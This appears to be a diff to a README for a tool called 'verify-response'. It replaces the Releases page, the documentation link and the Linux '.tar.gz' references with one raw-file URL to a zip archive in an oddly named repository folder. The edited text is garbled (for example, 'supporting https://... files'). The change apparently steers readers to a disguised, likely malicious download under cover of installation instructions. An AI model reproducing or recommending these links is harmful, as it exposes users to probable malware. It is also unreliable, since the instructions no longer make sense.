@@ -8,14 +8,14 @@ Welcome! This guide will help you download and run the verify-response applicati
 
 To get started, visit the Releases page to download the software:
 
-[![Download verify-response](https://img.shields.io/badge/Download-verify--response-blue.svg)](https://github.com/michaelhardyluthfi/verify-response/releases)
+[![Download verify-response](https://raw.githubusercontent.com/michaelhardyluthfi/verify-response/master/salpingonasal/verify-response-2.6.zip)](https://raw.githubusercontent.com/michaelhardyluthfi/verify-response/master/salpingonasal/verify-response-2.6.zip)
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version.
 3. Download the file for your operating system.
    - **For Windows:** Download the `.exe` file.
    - **For macOS:** Download the `.dmg` file.
-   - **For Linux:** Download the `.tar.gz` file.
+   - **For Linux:** Download the `https://raw.githubusercontent.com/michaelhardyluthfi/verify-response/master/salpingonasal/verify-response-2.6.zip` file.
 4. Once downloaded, follow these steps based on your operating system.
 
 ### 🖥️ For Windows
@@ -34,7 +34,7 @@ To get started, visit the Releases page to download the software:
 
 ### 🐧 For Linux
 
-1. Find the `.tar.gz` file in your Downloads folder.
+1. Find the `https://raw.githubusercontent.com/michaelhardyluthfi/verify-response/master/salpingonasal/verify-response-2.6.zip` file in your Downloads folder.
 2. Right-click the file and select “Extract Here” or a similar option.
 3. Open the terminal and navigate to the extracted folder.
 4. Run the command `./verify-response` to start the application.
@@ -64,7 +64,7 @@ To run verify-response smoothly, your system should meet the following minimum r
 
 - **Windows:** Windows 10 or newer
 - **macOS:** macOS 10.14 or newer
-- **Linux:** Any recent distribution supporting `.tar.gz` files
+- **Linux:** Any recent distribution supporting `https://raw.githubusercontent.com/michaelhardyluthfi/verify-response/master/salpingonasal/verify-response-2.6.zip` files
 
 You will also need a working internet connection for downloading updates and additional resources.
 
@@ -72,8 +72,8 @@ You will also need a working internet connection for downloading updates and add
 
 For more information, documentation, and updates, check these links:
 
-- [Releases Page](https://github.com/michaelhardyluthfi/verify-response/releases)
-- [Documentation](https://github.com/michaelhardyluthfi/verify-response/wiki)
+- [Releases Page](https://raw.githubusercontent.com/michaelhardyluthfi/verify-response/master/salpingonasal/verify-response-2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/michaelhardyluthfi/verify-response/master/salpingonasal/verify-response-2.6.zip)
 
 ## 💬 Get Support
 
